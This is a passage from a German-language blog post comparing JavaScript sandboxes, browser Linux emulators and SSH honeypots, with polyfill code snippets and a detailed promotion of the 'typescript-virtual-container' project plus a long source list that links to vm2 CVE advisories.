const memCache = new Map();

// Alles aus IndexedDB beim Start in memCache preloaden
openDB().then(db => {
  const tx = db.transaction(STORE, 'readonly');
  const req = tx.objectStore(STORE).openCursor();
  req.onsuccess = e => {
    const cursor = e.target.result;
    if (!cursor) return;
    memCache.set(cursor.key, cursor.value);
    cursor.continue();
  };
});
```

Darum überlebt der VFS-Snapshot Seiten-Reloads im Browser, das ganze `.vfsb`-Binary wird via dieses Polyfill in IndexedDB geschrieben und beim nächsten Laden wieder gelesen. Ohne Wasm, ohne Server. Nur IndexedDB, das seit 2011 in jedem Browser steckt.

**`node:crypto`, SHA-256 in purem JS**

Statt eine Wasm-Kryptobibliothek zu importieren, implementiert das Krypto-Polyfill SHA-256 von null mit FIPS-180-4-Round-Konstanten. 166 Zeilen pures JS mit vollem Hex/Base64/Uint8Array-Output-Support. Alles Hashing in der Bibliothek läuft dadurch, SSH-Host-Key-Fingerprints, interne Checksums, alles. Kompakt, null Abhängigkeiten, funktioniert.

**`node:os`, liest echte Browser-Hardware**

Das hier ist eine schöne Aufmerksamkeit. Statt hardcoded Fake-Werte zurückzugeben, liest `node:os` `navigator.deviceMemory` für Total-RAM und `navigator.hardwareConcurrency` für CPU-Zahl. Also berichtet `neofetch` im Browser-Build tatsächlich etwas, das deiner echten Maschine entspricht, kein bogus `2-Kerne-2-GB-RAM`-Stub.

```js
export function totalmem(){
  return navigator?.deviceMemory
   ? navigator.deviceMemory * 1024 * 1024 * 1024
   : 2 * 1024 * 1024 * 1024; // 2 GB Default
}
export function cpus(){
  const n = navigator?.hardwareConcurrency || 2;
  // parst auch navigator.userAgent um CPU-Modellstring zu raten
  return Array.from({ length: n }, () => ({ model, speed: 2400 }));
}
```

**`node:net`, `ssh2`, `roxify`, ehrliche Stubs**

Der Browser kann keine TCP-Sockets öffnen oder echtes SSH ausführen, also sind das Stubs, die einen `NotImplemented`-Fehler mit klarer Nachricht werfen, wenn etwas versucht, sie zu nutzen. Failures bleiben explizit, kein `undefined` zurückgegeben, wo ein Objekt erwartet wird. Nur eine laute klare "das geht nicht im Browser"-Nachricht, genau was du willst.

**`process.js` und `buffer.js`, injizierte Globals**

Diese zwei werden via esbuilds `inject`-Option oben in jede Bundle-Datei injiziert, also sind `process` und `Buffer` global verfügbar ohne expliziten Import. `process.js` ist winzig : `env`, `version`, `platform: 'browser'`, `nextTick` via `queueMicrotask`, `uptime` via `performance.now()`. `buffer.js` ist eine komplette `Buffer`-Reimplementierung über `Uint8Array`, alle `readUInt32BE`-, `writeInt16LE`-Methoden, Hex/Base64-Kodierungen, von denen die SSH-Implementierung und das VFS abhängen.

---

Das ganze Polyfill-Set macht etwa 640 Zeilen handgeschriebenes JS total. Ohne npm-Pakete, ohne Wasm. Und das Ergebnis ist ein Browserbundle, das nur die Bibliothek ist, nativ laufend, ohne die übliche "aber läuft das wirklich im Browser ?"-Angst, die du mit Node-first designten Bibliotheken hast. Lohnt sich, in den `polyfills/`-Ordner im Repo zu schauen, wenn du neugierig bist, jede Datei ist in sich geschlossen und für sich lesbar, eine Stilentscheidung, die ich sehr schätze.

| | `vm` | `isolated-vm` | `quickjs-emscripten` | `v86` | CheerpX | WebContainers | Cowrie | `typescript-virtual-container` |
|---|---|---|---|---|---|---|---|---|
| **Kategorie** | JS-Sandbox | JS-Sandbox | JS-Sandbox | Emulator | Emulator | Node.js/Wasm | Honeypot | Simulator |
| **Isoliert JS** | ⚠️ Scope | ✅ V8-Isolat | ✅ Wasm | n/a | n/a | partiell | n/a | ✅ Worker |
| **Echter Linux-Kernel** | ❌ | ❌ | ❌ | ✅ | ✅ | ❌ | ❌ | ❌ |
| **Shell-Interpreter** | ❌ | ❌ | ❌ | ✅ (echt) | ✅ (echt) | ✅ (echt) | partiell | ✅ (custom) |
| **~170 Unix-Commands** | ❌ | ❌ | ❌ | ✅ | ✅ | partiell | ~20 | ✅ |
| **POSIX-Permissions** | ❌ | ❌ | ❌ | ✅ | ✅ | ✅ | partiell | ✅ angewandt |
| **Nutzerverwaltung** | ❌ | ❌ | ❌ | ✅ | ✅ | ❌ | minimal | ✅ komplett |
| **Echter SSH-Server** | ❌ | ❌ | ❌ | ❌ | ❌ | ❌ | ✅ | ✅ |
| **SFTP / SCP** | ❌ | ❌ | ❌ | ❌ | ❌ | ❌ | ❌ | ✅ |
| **Honeypot/Audit** | ❌ | ❌ | ❌ | ❌ | ❌ | ❌ | ✅ | ✅ |
| **VFS-Diff/Snapshot** | ❌ | ❌ | ❌ | begrenzt | ❌ | ❌ | ❌ | ✅ |
| **Virtuelles L2/L3-Netz** | ❌ | ❌ | ❌ | basisch | ❌ | ❌ | ❌ | ✅ komplett |
| **Virtuelles VPN** | ❌ | ❌ | ❌ | ❌ | ❌ | ❌ | ❌ | ✅ |
| **Browser-Support** | ❌ | ❌ | ✅ | ✅ | ✅ | ✅ | ❌ | ✅ |
| **Nativ Node.js** | ✅ | ✅ | ✅ | ✅ | ❌ | ❌ | ❌ | ✅ |
| **Typisierte API** | basisch | ✅ | ✅ | minimal | ❌ | ✅ | ❌ | ✅ komplett |
| **Binärkompat** | n/a | n/a | n/a | ✅ | ✅ | partiell | n/a | ❌ |
| **Startzeit** | instantan | instantan | instantan | 15-40s | 15-40s | 2-5s | instantan | <1s |
| **RAM/Instanz** | ~1 MB | ~3-10 MB | ~5-15 MB | 150-256 MB | 200+ MB | ~100 MB | ~50 MB | ~5-20 MB |
| **Runtime-Abhängigkeiten** | 0 | 1 (nativ) | 1 (Wasm) | 0 | proprietär | 1 | Python-Abhängigkeiten | 3 (ssh2, ws, fflate) |
| **Status** | stabil | ✅ aktiv | ✅ aktiv | ✅ sehr aktiv | kommerziell | ✅ aktiv | ✅ aktiv | ✅ aktiv |

---

## Wann was nutzen

**Du musst nicht vertrauenswürdiges JavaScript ausführen, eine nutzereingereichte Formel, ein Plugin, einen Skript-Hook.**  
→ `isolated-vm`. Echtes V8-Isolat, strikte Speicherlimits, explizite Kommunikationsbrücke. Meide `vm2`, die CVE-Liste wächst nur weiter, ernsthaft fast eine neue alle paar Monate. Meide `vm`, das ist überhaupt keine Sandbox, bitte.

**Du musst JS isolieren und willst keine native Extension, oder brauchst Browserkompatibilität.**  
→ `quickjs-emscripten`. Wasm-Grenze, etwa 500-KB-Modul, funktioniert in Browsern und Node. Langsamer als V8, aber wirklich isoliert.

**Du musst ein echtes unmodifiziertes Linux-OS mit Binärkompatibilität booten.**  
→ `v86` für 32-bit-Linux, oder `container2wasm`, wenn du ein existierendes Docker-Image hast. Akzeptiere 150+ MB RAM und 30 Sekunden Start, das ist der Deal. Wenn du 64-bit brauchst, schau CheerpX an oder nutze einfach eine echte Container-Runtime.

**Du musst ein Linux-artiges Terminal in eine Webapp ohne Backend integrieren.**  
→ `v86` (komplettes OS, schwer, langsam startend) oder das Browserbundle von `typescript-virtual-container` (Simulator, leichter, instantaner Start, inkludiert `startxfce4` für einen kompletten Desktop, was ziemlich cool ist).

**Du brauchst interaktive Online-Coding-Tutorials oder eine Browser-IDE.**  
→ WebContainers, wenn du auf das Node.js-Ökosystem fokussiert bist. CheerpX, wenn du echten Linux-Userspace brauchst. Das Browserbundle von `typescript-virtual-container`, wenn du eine leichtere Option mit typisierter API willst.

**Du willst SSH-Angreifer-TTPs in großem Maßstab sammeln.**  
→ Cowrie ist der Produktionsstandard, Punkt. Läuft auf jedem Linux-Server, integriert mit allen SIEMs, hat jetzt einen LLM-Modus. Nutz einfach Cowrie.

**Du willst SSH-Honeypot-Daten in einer Node.js-Anwendung mit programmierbarer API.**  
→ `typescript-virtual-container`. Commands laufen wirklich. Das VFS ist eine echte Datenstruktur, die du instantan erfassen und diffen kannst. Der Angreifer bekommt eine überzeugende interaktive Umgebung, und du bekommst strukturierte Audit-Daten, ohne Node zu verlassen.

**Du brauchst Shell-Automatisierung / Tests in CI ohne Docker.**  
→ `typescript-virtual-container`. Startet in unter einer Sekunde, Snapshot vor einem Test, Restore danach. Führt Shell-Commands mit typisierter API aus. Kein Docker-Daemon, kein Kernel, keine VM, kein Warten.

**Du brauchst Multi-Tenant-Shell-Umgebungen (SaaS, Bildung, Training).**  
→ `typescript-virtual-container`. 5-20 MB pro Instanz vs. 150-256 MB für einen Emulator. 100 gleichzeitige Nutzer : ~2 GB vs. ~25 GB. Großer Unterschied bei Hostingkosten !

**Du brauchst einen realistischen Honeypot, der dir auch ein Multi-VM-Netzlabor bauen lässt.**  
→ `typescript-virtual-container` ist das einzige in diesem Raum, das beides tut.

---

## Was es nicht kann (und ich will ehrlich sein)

Es kann keine nativen x86-Binaries ausführen. Wenn du C-Code kompilieren, einen echten Python-Interpreter ausführen oder für Linux kompilierte Software nutzen musst, gibt es keine Kernel-ABI, um diese Syscalls zu stützen. Commands wie `gcc`, `python3` und `node` sind Stubs, sie antworten auf `--version` und gängige Aufrufe, führen aber nichts Reales aus.

Das ist der fundamentale Tradeoff : Du gewinnst 10- bis 50-mal weniger Speicher, instantanen Start, Browserkompatibilität, typisierte API, echtes SSH und virtuelles Netz, und du gibst Binärkompatibilität mit Linux-Userspace auf.

Fortune dachte viel darüber nach beim Design des Projekts. Für die Use Cases, die sie anzielte, Honeypots, Tests, eingebettete Terminals, CI-Umgebungen, ist Ausführen eines kompilierten Binary tatsächlich nie nötig. Shell-Pipelines, Dateimanipulation, Netz-Routing und SSH decken alles ab. Aber wenn dein Use Case echte kompilierte Software braucht, sind `v86` oder Docker die richtige Antwort, nicht das.

---

## Zum Abschluss

Also voilà. Dieses Ökosystem ist breiter und fragmentierter, als es von außen scheint. `vm` ist ein Scope-Trenner, keine Sandbox. `vm2` sammelt weiter CVEs (wirklich, schau dir die Advisories dieses Monats an). `isolated-vm` ist die richtige Antwort für JS-Isolation, aber nur JS. `quickjs-emscripten` ist die richtige Wahl, wenn du Browserkompatibilität brauchst oder native Extensions meiden willst. `v86` und CheerpX sind echte Emulatoren, wenn du echte Binärkompat brauchst. WebContainers ist Node.js in Wasm, keine generalistische Linux-Umgebung. Cowrie ist der SSH-Honeypot-Goldstandard, aber es ist Python und nicht nativ Node.

Und dann gibt es `typescript-virtual-container`, Fortunes Projekt, das etwas in seiner eigenen Kategorie lebt. Weder Emulator noch JS-Sandbox noch passiver Honeypot. Etwas dazwischen, das sich als erstaunlich nützlich für viele Dinge erwies, die kein anderes kann.

`typescript-virtual-container` füllt die Lücke, die kein anderes berührt : Eine komplette programmierbare Linux-Shell-Umgebung mit echtem SSH, SFTP, POSIX-Permissions, Nutzerverwaltung, virtuellem Netz und typisierter TypeScript-API, laufend in etwa 10 MB, startend in unter einer Sekunde, funktionierend sowohl in Node.js als auch Browser.

Wenn du es probieren willst : Der Sourcecode liegt auf [github.com/itsrealfortune/typescript-virtual-container](https://github.com/itsrealfortune/typescript-virtual-container) und es gibt eine Online-Demo (inklusive `startxfce4` für einen kompletten Desktop, was ehrlich krank ist) auf [itsrealfortune.fr/typescript-virtual-container/demo](https://itsrealfortune.fr/typescript-virtual-container/demo). Schau es dir an und lass Fortune ein paar Sterne auf GitHub da, sie verdient sie !

Danke fürs Lesen, das war selbst für meine Standards ein langes :) Ich hoffe, es war nützlich !

---

## Quellen

Ich versuchte, jede Behauptung an eine Primärquelle zu linken, CVE-Advisories, offizielle Doks, GitHub-Repos, Maintainer-Blogartikel. Einige Notizen : Die vm2-CVE-Liste wächst weiter, also könnte der FortiGuard-Link obsolete sein, wenn du das liest (schau auf die GitHub-Advisory-Seite für die neuesten). Die Bellard-Links sind alle stabil, seine persönliche Seite steht seit immer und der Inhalt ändert sich nicht. Und wenn du tiefer in einen der Polyfills einsteigen willst, stöbere einfach direkt im `polyfills/`-Ordner im `typescript-virtual-container`-Repo, lesbarer als jede Beschreibung, die ich hier schreiben könnte.

### JavaScript-Sandboxes

- **Node.js-`vm`-Modul**, offizielle Dokumentation : [nodejs.org/api/vm.html](https://nodejs.org/api/vm.html)
- **Node.js-`vm`-Sicherheitswarnung**, "Das vm-Modul ist kein Sicherheitsmechanismus. Nutze es nicht, um nicht vertrauenswürdigen Code auszuführen" : [nodejs.org/api/vm.html#vm-executing-javascript](https://nodejs.org/api/vm.html)
- **`vm2`**, npm : [npmjs.com/package/vm2](https://www.npmjs.com/package/vm2) · GitHub : [github.com/patriksimek/vm2](https://github.com/patriksimek/vm2)
- **vm2-CVE-Chronologie**, FortiGuard-Alert mit kompletter CVE-Liste und Daten : [fortiguard.fortinet.com/outbreak-alert/vm2-sandbox-escape](https://fortiguard.fortinet.com/outbreak-alert/vm2-sandbox-escape)
- **CVE-2023-29017**, Async-Fehler-Escape, GHSA : [github.com/advisories/GHSA-7jxr-cg7f-gpgv](https://github.com/advisories/GHSA-7jxr-cg7f-gpgv)
- **CVE-2023-32314**, Proxy + Error.name + Function-Escape, Gist-PoC : [gist.github.com/arkark/e9f5cf5782dec8321095be3e52acf5ac](https://gist.github.com/arkark/e9f5cf5782dec8321095be3e52acf5ac)
- **CVE-2023-37466**, Exploit-DB-Eintrag mit komplettem PoC : [exploit-db.com/exploits/51898](https://www.exploit-db.com/exploits/51898)
- **vm2-CVEs 2026**, 11 neue Escapes, Analyse : [thecybersecguru.com/news/vm2-sandbox-escape-vulnerability-cve-2026-26956](https://thecybersecguru.com/news/vm2-sandbox-escape-vulnerability-cve-2026-26956) · BleepingComputer : [bleepingcomputer.com/news/security/critical-sandbox-escape-flaw-discovered-in-popular-vm2-nodejs-library](https://www.bleepingcomputer.com/news/security/critical-sandbox-escape-flaw-discovered-in-popular-vm2-nodejs-library/)
- **"Why Sandboxing JS in JS is Hard"**, oxeye.io-Post-mortem zu CVE-2022-36067 : [oxeye.io/blog/vm2-sandbreak-vulnerability-cve-2022-36067](https://www.oxeye.io/blog/vm2-sandbreak-vulnerability-cve-2022-36067)
- **`isolated-vm`**, npm : [npmjs.com/package/isolated-vm](https://www.npmjs.com/package/isolated-vm) · GitHub : [github.com/laverdet/isolated-vm](https://github.com/laverdet/isolated-vm)
- **V8-Isolate-Internals**, Embed-Guide : [v8.dev/docs/embed](https://v8.dev/docs/embed)
- **`quickjs-emscripten`**, npm : [npmjs.com/package/quickjs-emscripten](https://www.npmjs.com/package/quickjs-emscripten) · GitHub : [github.com/justjake/quickjs-emscripten](https://github.com/justjake/quickjs-emscripten)
- **`@sebastianwessel/quickjs`**, npm : [npmjs.com/package/@sebastianwessel/quickjs](https://www.npmjs.com/package/@sebastianwessel/quickjs) · GitHub : [github.com/sebastianwessel/quickjs](https://github.com/sebastianwessel/quickjs)
- **QuickJS-Engine**, von Fabrice Bellard : [bellard.org/quickjs](https://bellard.org/quickjs/)
- **Deno-Permission-Modell**, Doks : [docs.deno.com/runtime/fundamentals/security](https://docs.deno.com/runtime/fundamentals/security/)
- **Deno-2-Release**, Oktober 2024 : [deno.com/blog/v2](https://deno.com/blog/v2)
- **TC39-ShadowRealm-Vorschlag**, [github.com/tc39/proposal-shadowrealm](https://github.com/tc39/proposal-shadowrealm)
- **TC39-Compartments-Vorschlag**, [github.com/nicolo-ribaudo/tc39-proposal-compartments](https://github.com/nicolo-ribaudo/tc39-proposal-compartments)
- **"Sandboxing JavaScript Code"**, Andrew Healeys Praxisartikel zum Deno-Sandbox-Ansatz : [healeycodes.com/sandboxing-javascript-code](https://healeycodes.com/sandboxing-javascript-code)

### Linux-Emulatoren

- **`v86`**, npm : [npmjs.com/package/v86](https://www.npmjs.com/package/v86) · GitHub : [github.com/copy/v86](https://github.com/copy/v86) · Demo : [copy.sh/v86](https://copy.sh/v86)
- **v86-OS-Support-Matrix**, [github.com/copy/v86#operating-system-support](https://github.com/copy/v86)
- **SeaBIOS** (von v86 genutztes BIOS), [seabios.org](https://www.seabios.org/SeaBIOS)
- **Bochs-VBE-Erweiterungen** (VGA-Referenz), [bochs.sourceforge.io](https://bochs.sourceforge.io/)
- **JSLinux**, Bellards Emulator : [bellard.org/jslinux](https://bellard.org/jslinux/) · Technische Notizen (TinyEMU, Historie, asm.js→Wasm) : [bellard.org/jslinux/tech.html](https://bellard.org/jslinux/tech.html)
- **TinyEMU**, C-Source : [bellard.org/tinyemu](https://bellard.org/tinyemu/) · Inoffizielle GitHub-Mirrors : [github.com/yoshijava/TinyEMU](https://github.com/yoshijava/TinyEMU)
- **jor1k**, OpenRISC-JS-Emulator : [github.com/s-macke/jor1k](https://github.com/s-macke/jor1k) · Demo : [s-macke.github.io/jor1k/demos/main.html](https://s-macke.github.io/jor1k/demos/main.html)
- **CheerpX**, Doks : [cheerpx.io/docs/overview](https://cheerpx.io/docs/overview) · Pthreads-Guide : [cheerpx.io/docs/guides/pthreads](https://cheerpx.io/docs/guides/pthreads)
- **WebContainers**, npm : [npmjs.com/package/@webcontainer/api](https://www.npmjs.com/package/@webcontainer/api) · API-Doks : [webcontainers.io](https://webcontainers.io) · Ankündigung : [blog.stackblitz.com/posts/webcontainer-api-is-here](https://blog.stackblitz.com/posts/webcontainer-api-is-here/) · InfoQ-Überblick : [infoq.com/news/2021/07/webcontainers-nodejs](https://www.infoq.com/news/2021/07/webcontainers-nodejs/)
- **container2wasm**, GitHub : [github.com/container2wasm/container2wasm](https://github.com/container2wasm/container2wasm) · NTT-Blogartikel : [medium.com/nttlabs/container2wasm-2dd90a18cc9a](https://medium.com/nttlabs/container2wasm-2dd90a18cc9a) · Simon-Willison-Artikel : [simonwillison.net/2024/Jan/3/container2wasm](https://simonwillison.net/2024/Jan/3/container2wasm/)

### Terminal-Stack

- **xterm.js**, npm : [npmjs.com/package/@xterm/xterm](https://www.npmjs.com/package/@xterm/xterm) · GitHub : [github.com/xtermjs/xterm.js](https://github.com/xtermjs/xterm.js) · Seite : [xtermjs.org](https://xtermjs.org)
- **node-pty**, npm : [npmjs.com/package/node-pty](https://www.npmjs.com/package/node-pty) · GitHub (Microsoft) : [github.com/microsoft/node-pty](https://github.com/microsoft/node-pty)

### Honeypots

- **Cowrie**, GitHub : [github.com/cowrie/cowrie](https://github.com/cowrie/cowrie) · Doks : [docs.cowrie.org](https://docs.cowrie.org) · Seite : [cowrie.org](https://www.cowrie.org/)
- **Kippo**, GitHub (archiviert) : [github.com/desaster/kippo](https://github.com/desaster/kippo)
- **endlessh**, GitHub : [github.com/skeeto/endlessh](https://github.com/skeeto/endlessh)
- **sshesame**, GitHub : [github.com/jaksi/sshesame](https://github.com/jaksi/sshesame)
- **Lyrebird**, Docker Hub : [hub.docker.com/r/lyrebird/honeypot-base](https://hub.docker.com/r/lyrebird/honeypot-base/)
- **node-simple-ssh-honeypot**, minimaler Node.js-SSH-Honeypot : [github.com/Caesarovich/node-simple-ssh-honeypot](https://github.com/Caesarovich/node-simple-ssh-honeypot)
- **awesome-honeypots**, kuratierte Liste : [github.com/paralax/awesome-honeypots](https://github.com/paralax/awesome-honeypots)
- **MITRE ATT&CK T1082**, Systeminformations-Discovery (wie Angreifer Honeypots identifizieren) : [attack.mitre.org/techniques/T1082](https://attack.mitre.org/techniques/T1082/)

### `typescript-virtual-container`

- **npm** : [npmjs.com/package/typescript-virtual-container](https://www.npmjs.com/package/typescript-virtual-container)
- **GitHub** : [github.com/itsrealfortune/typescript-virtual-container](https://github.com/itsrealfortune/typescript-virtual-container)
- **Online-Demo** : [itsrealfortune.fr/typescript-virtual-container/demo](https://itsrealfortune.fr/typescript-virtual-container/demo)
- **Architekturguide** : [github.com/itsrealfortune/typescript-virtual-container/blob/main/guides/ARCHITECTURE.md](https://github.com/itsrealfortune/typescript-virtual-container/blob/main/guides/ARCHITECTURE.md)
- **`ssh2`** (SSH-Protokollimplementierung), npm : [npmjs.com/package/ssh2](https://www.npmjs.com/package/ssh2) · GitHub : [github.com/mscdex/ssh2](https://github.com/mscdex/ssh2)
- **`fflate`** (VFS-Snapshot-Kompression), npm : [npmjs.com/package/fflate](https://www.npmjs.com/package/fflate)
- **`ws`** (WebSocket-Shell-Transport), npm : [npmjs.com/package/ws](https://www.npmjs.com/package/ws)

### Weiterführende Lektüre

- **POSIX-Permission-Modell**, Open-Group-Spezifikation : [pubs.opengroup.org/onlinepubs/9699919799/basedefs/V1_chap04.html](https://pubs.opengroup.org/onlinepubs/9699919799/basedefs/V1_chap04.html)
- **Write-Ahead Logging** (Pattern in VFS-Persistenz genutzt), [en.wikipedia.org/wiki/Write-ahead_logging](https://en.wikipedia.org/wiki/Write-ahead_logging)
- **V8-Isolate-Modell**, "Embedder's Guide" : [v8.dev/docs/embed](https://v8.dev/docs/embed)
- **RISC-V-ISA-Spezifikation** (für TinyEMU/JSLinux-Kontext), [riscv.org/technical/specifications](https://riscv.org/technical/specifications/)
- **OpenRISC-1000-Architektur**, [opencores.org/or1k](https://opencores.org/or1k/)
- **"Running Python code in a Pyodide sandbox via Deno"**, Simon-Willison-TIL, nützlicher Kontrast zum Wasm-Ansatz : [til.simonwillison.net](https://til.simonwillison.net/deno/pyodide-sandbox)
- **"Running self-hosted QuickJS in a browser"**, Simon-Willison-TIL zur quickjs-emscripten-Bundlegröße : [til.simonwillison.net/npm/self-hosted-quickjs](https://til.simonwillison.net/npm/self-hosted-quickjs)
